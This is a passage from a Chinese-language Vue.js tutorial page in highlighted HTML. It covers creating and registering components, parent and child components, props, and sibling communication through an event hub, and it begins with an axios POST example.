axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"https://autumnfish.cn/api/user/reg"</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>username<span class="token punctuation">:</span><span class="token string">"alice"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">{</span>                                          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                         <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>                                                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token punctuation">}</span><span class="token punctuation">)</span>                                        <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><img src="https://pic.downk.cc/item/5f21372314195aa594558bcb.png" alt=""></p><h2 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h2><p>组件化：将一个页面拆分成一个小的功能块，每个功能块有属于自己这部分独立的功能。</p><p><img src="https://pic.downk.cc/item/5f227b5e14195aa5940d1942.png" alt=""></p><h3 id="组件的使用"><a href="#组件的使用" class="headerlink" title="组件的使用"></a>组件的使用</h3><p>组件使用分成三个步骤：</p><ol><li>创建组件构造器  Vue.extend()方法创建组件构造器</li><li>注册组件 Vue.component()方法注册组件</li><li>使用组件  在Vue实例的作用范围内使用组件</li></ol><h4 id="基础创建"><a href="#基础创建" class="headerlink" title="基础创建"></a>基础创建</h4><blockquote><p>注：以下写法只帮助理解，现在不用此写法注册组件</p></blockquote><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 3.使用组件 --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>my-cpn</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>my-cpn</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token comment" spellcheck="true">//1.创建组件构造器对象</span>            <span class="token keyword">const</span> cpnC <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                template<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`  //ES6新语法，使用`</span></span><span class="token template-string"><span class="token string">`自动换行                &lt;div>                    &lt;h2>hello&lt;/h2>                &lt;/div>`</span></span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//2.注册组件</span>            Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'my-cpn'</span><span class="token punctuation">,</span>cpnC<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//注册组件的标签名，组件构造器</span>            <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="全局组件和局部组件"><a href="#全局组件和局部组件" class="headerlink" title="全局组件和局部组件"></a>全局组件和局部组件</h3><h4 id="全局组件"><a href="#全局组件" class="headerlink" title="全局组件"></a>全局组件</h4><p>全局组件的注册方法如上述代码</p><h4 id="局部组件"><a href="#局部组件" class="headerlink" title="局部组件"></a>局部组件</h4><p>在某个Vue实例下进行注册</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 3.使用组件 --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>my-cpn</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>my-cpn</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 生效 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 3.使用组件 --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>my-cpn</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>my-cpn</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 无效 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token comment" spellcheck="true">//1.创建组件构造器对象</span>            <span class="token keyword">const</span> cpnC <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                template<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`  //ES6新语法，使用`</span></span><span class="token template-string"><span class="token string">`自动换行                &lt;div>                    &lt;h2>hello&lt;/h2>                &lt;/div>`</span></span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                components<span class="token punctuation">:</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//2.注册局部组件</span>                    cpn<span class="token punctuation">:</span>cpnC  <span class="token comment" spellcheck="true">//组件标签名：组件构造器，</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>上述代码创建的组件只允许id为app的html块使用</p><h3 id="父组件和子组件"><a href="#父组件和子组件" class="headerlink" title="父组件和子组件"></a>父组件和子组件</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cpn2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cpn2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token comment" spellcheck="true">//1.第一个组件(子组件)</span>            <span class="token keyword">const</span> cpnC1 <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                template<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`                &lt;div>                    &lt;h2>我是第一个组件&lt;/h2>                &lt;/div>`</span></span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//2.第二个组件(父组件)</span>            <span class="token keyword">const</span> cpnC2 <span class="token operator">=</span> Vue<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                template<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`                &lt;div>                    &lt;h2>我是第二个组件&lt;/h2>                    &lt;cpn1>&lt;/cpn1>                 &lt;/div>`</span></span><span class="token punctuation">,</span>                components<span class="token punctuation">:</span><span class="token punctuation">{</span>                    cpn1<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//组件1放到组件2进行注册，组件1只能在组件2中使用</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//2.注册组件(可以把此组件当作根组件)</span>            <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                components<span class="token punctuation">:</span><span class="token punctuation">{</span>                    cpn2<span class="token punctuation">:</span>cpnC2<span class="token punctuation">,</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="注册组件的语法糖"><a href="#注册组件的语法糖" class="headerlink" title="注册组件的语法糖"></a>注册组件的语法糖</h3><p>省去了调用Vue.extend()的步骤，直接使用对象来代替</p><h4 id="注册全局组件"><a href="#注册全局组件" class="headerlink" title="注册全局组件"></a>注册全局组件</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 3.使用组件 --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>my-cpn</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>my-cpn</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token comment" spellcheck="true">//2.创建构造器，注册组件，源代码中也采用extend()方法创建组件</span>            Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'my-cpn'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                template<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`                  &lt;div>                    &lt;h2>hello&lt;/h2>                &lt;/div>`</span></span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>             <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h4 id="注册局部组件"><a href="#注册局部组件" class="headerlink" title="注册局部组件"></a>注册局部组件</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                components<span class="token punctuation">:</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//2.注册局部组件</span>                    cpn<span class="token punctuation">:</span><span class="token punctuation">{</span>                template<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`                  &lt;div>                    &lt;h2>hello&lt;/h2>                &lt;/div>`</span></span>            <span class="token punctuation">}</span>                 <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><blockquote><p>注：Vue组件中的数据只能在注册组件的过程中通过data函数的形式进行定义，并且一定要return一个数</p></blockquote><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'cpn'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                props<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">,</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                template<span class="token punctuation">:</span><span class="token string">'#cpn'</span><span class="token punctuation">,</span>                <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token punctuation">{</span>                        msg<span class="token punctuation">:</span><span class="token string">"子组件本身的数据"</span><span class="token punctuation">,</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span>                    message<span class="token punctuation">:</span><span class="token string">"父组件的内容"</span><span class="token punctuation">,</span>                    title1<span class="token punctuation">:</span><span class="token string">"world"</span><span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="组件的数据交互"><a href="#组件的数据交互" class="headerlink" title="组件的数据交互"></a>组件的数据交互</h2><h3 id="父组件向子组件传值"><a href="#父组件向子组件传值" class="headerlink" title="父组件向子组件传值"></a>父组件向子组件传值</h3><p>在子组件不能修改props数据，应该触发事件让父组件处理</p><ol><li>组件内部使用props接收传递过来的值</li></ol><pre class=" language-js"><code class="language-js">Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'menu-item'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>  props<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  template<span class="token punctuation">:</span> <span class="token string">'&lt;div>&lt;h2>hello&lt;/h2>&lt;/div>'</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ol start="2"><li>父组件通过属性将值传递给子组件</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>menu-item</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>来自父组件的数据<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>menu-item</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 静态绑定 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>menu-item</span> <span class="token attr-name">:title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>menu-item</span><span class="token punctuation">></span></span>　<span class="token comment" spellcheck="true">&lt;!-- 动态绑定 --></span></code></pre><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cpn</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>来自父组件<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cpn</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cpn</span> <span class="token attr-name"><span class="token namespace">v-bind:</span>title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title1<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>hello<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cpn</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cpn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>{{msg}}----{{title}}----{{content}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'cpn'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                props<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">,</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                template<span class="token punctuation">:</span><span class="token string">'#cpn'</span><span class="token punctuation">,</span>                <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token punctuation">{</span>                        msg<span class="token punctuation">:</span><span class="token string">"子组件本身的数据"</span><span class="token punctuation">,</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span>                    message<span class="token punctuation">:</span><span class="token string">"父组件的内容"</span><span class="token punctuation">,</span>                    title1<span class="token punctuation">:</span><span class="token string">"world"</span><span class="token punctuation">,</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><p><img src="https://pic.downk.cc/item/5f276ced14195aa594c7241c.png" alt=""></p><blockquote><p>注：props传递数据原则：单向数据流(由父组件向子组件传值)</p></blockquote><pre class=" language-html"><code class="language-html"></code></pre><h3 id="非父子组件间传值"><a href="#非父子组件间传值" class="headerlink" title="非父子组件间传值"></a>非父子组件间传值</h3><h4 id="事件中心传值"><a href="#事件中心传值" class="headerlink" title="事件中心传值"></a>事件中心传值</h4><p>单独的事件中心管理组件间的通信</p><p><img src="https://pic.downk.cc/item/5f276fd314195aa594c80968.png" alt=""></p><h5 id="创建事件中心"><a href="#创建事件中心" class="headerlink" title="创建事件中心"></a>创建事件中心</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> eventHub <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h5 id="监听与销毁事件"><a href="#监听与销毁事件" class="headerlink" title="监听与销毁事件"></a>监听与销毁事件</h5><pre class=" language-js"><code class="language-js">eventHub<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'add-todo'</span><span class="token punctuation">,</span>addTodo<span class="token punctuation">)</span>eventHub<span class="token punctuation">.</span><span class="token function">$off</span><span class="token punctuation">(</span><span class="token string">'add-todo'</span><span class="token punctuation">)</span></code></pre><h5 id="触发事件"><a href="#触发事件" class="headerlink" title="触发事件"></a>触发事件</h5><pre class=" language-js"><code class="language-js">eventHub<span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'add-todo'</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span></code></pre><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bro1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bro1</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bro2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bro2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>{{name}}:{{num}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>handle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>点击<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token comment" spellcheck="true">//提供事件中心</span>            <span class="token keyword">var</span> hub <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'bro1'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token punctuation">{</span>                        num<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                        name<span class="token punctuation">:</span><span class="token string">"Tom"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                template<span class="token punctuation">:</span> <span class="token string">"#add"</span><span class="token punctuation">,</span>                methods<span class="token punctuation">:</span><span class="token punctuation">{</span>                    handle<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">//触发兄弟组件的事件</span>                        hub<span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'jerry-event'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                mounted<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//监听事件</span>                    hub<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'tom-event'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">+</span><span class="token operator">=</span> val<span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'bro2'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token punctuation">{</span>                        num<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                        name<span class="token punctuation">:</span><span class="token string">"Jerry"</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                template<span class="token punctuation">:</span> <span class="token string">"#add"</span><span class="token punctuation">,</span>                methods<span class="token punctuation">:</span><span class="token punctuation">{</span>                    handle<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        hub<span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'tom-event'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                mounted<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//监听事件</span>                    hub<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'jerry-event'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">+</span><span class="token operator">=</span> val<span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>                data<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><p><img src="https://pic.downk.cc/item/5f277c9b14195aa594cb7842.png" alt=""></p><h2 id="Vue-cli"><a href="#Vue-cli" class="headerlink" 